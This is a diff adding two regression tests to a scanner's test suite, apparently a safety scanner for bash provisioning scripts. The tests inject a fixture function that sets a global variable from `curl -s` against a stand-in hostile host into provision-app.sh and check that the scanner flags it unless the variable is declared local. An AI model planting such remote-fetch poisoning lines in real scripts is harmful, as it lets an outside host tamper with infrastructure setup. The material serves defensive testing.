@@ -304,6 +304,38 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     expect(scanRealTree().offenders).toEqual([]);
   });
 
+  // ---- #1716 round 2 (review): scoping by call graph alone missed a real
+  // bash GLOBAL — a function that writes a followed name WITHOUT `local`izing
+  // it is not something call-graph reachability may exclude, because bash
+  // gives that write to the caller's (or the script's) binding regardless of
+  // whether this scanner's static call graph can reach the writer. Fixed by
+  // `globalWriterTexts`/`declaresLocal` in apply-safety-scan.mjs: a
+  // non-`local`'d write is unioned into `corpusWriteSites` from EVERY scope.
+  it("#1716 round 2: an unlocal'd global write in an UNREACHABLE function (reviewer repro) still reds provision-app.sh", () => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    // The reviewer's exact fixture: `poison_tl` writes $tl as a real bash
+    // global (no `local`), called only from `cmd_poison` — unreachable from
+    // record_reclaim_pending/clear_reclaim_pending's own call graph, and not
+    // an orphan (it IS statically called, just from somewhere irrelevant).
+    const poisoned = `poison_tl() { tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => poisoned);
+    expect(mutated).not.toBe(text);
+    const offenders = scanFile(file, mutated);
+    expect(offenders.length).toBeGreaterThan(0);
+  });
+
+  it('#1716 round 2: the SAME fixture stays clean when poison_tl declares \`local tl\` (a real function-local write, correctly excluded)', () => {
+    const file = `${D}provision-app.sh`;
+    const text = readTracked(file);
+    const anchor = 'cmd_destroy() {';
+    const localized = `poison_tl() { local tl; tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+    const mutated = text.replace(anchor, () => localized);
+    expect(mutated).not.toBe(text);
+    expect(scanFile(file, mutated)).toEqual([]);
+  });
+
   // ---- bypass class 1: fetch spellings and one-line chains ---------------
 
   it('class 1: catches every fetch spelling, a one-line chain, and a curl-wrapping helper', () => {
